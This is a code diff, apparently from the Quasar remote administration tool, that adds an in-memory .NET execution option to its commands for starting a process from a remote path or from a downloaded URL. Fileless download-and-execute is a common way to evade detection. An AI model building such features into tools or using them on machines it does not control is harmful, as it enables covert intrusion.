@@ -81,9 +81,9 @@ namespace Quasar.Server.Messages
         /// </summary>
         /// <param name="remotePath">The remote path used for starting the new process.</param>
         /// <param name="isUpdate">Decides whether the process is a client update.</param>
-        public void StartProcess(string remotePath, bool isUpdate = false)
+        public void StartProcess(string remotePath, bool isUpdate = false, bool executeInMemory = false)
         {
-            _client.Send(new DoProcessStart { FilePath = remotePath, IsUpdate = isUpdate });
+            _client.Send(new DoProcessStart { FilePath = remotePath, IsUpdate = isUpdate, ExecuteInMemoryDotNet = executeInMemory });
         }
 
         /// <summary>
@@ -91,9 +91,9 @@ namespace Quasar.Server.Messages
         /// </summary>
         /// <param name="url">The URL to download and execute.</param>
         /// <param name="isUpdate">Decides whether the file is a client update.</param>
-        public void StartProcessFromWeb(string url, bool isUpdate = false)
+        public void StartProcessFromWeb(string url, bool isUpdate = false, bool executeInMemory = false)
         {
-            _client.Send(new DoProcessStart { DownloadUrl = url, IsUpdate = isUpdate});
+            _client.Send(new DoProcessStart { DownloadUrl = url, IsUpdate = isUpdate, ExecuteInMemoryDotNet = executeInMemory });
         }
 
         /// <summary>
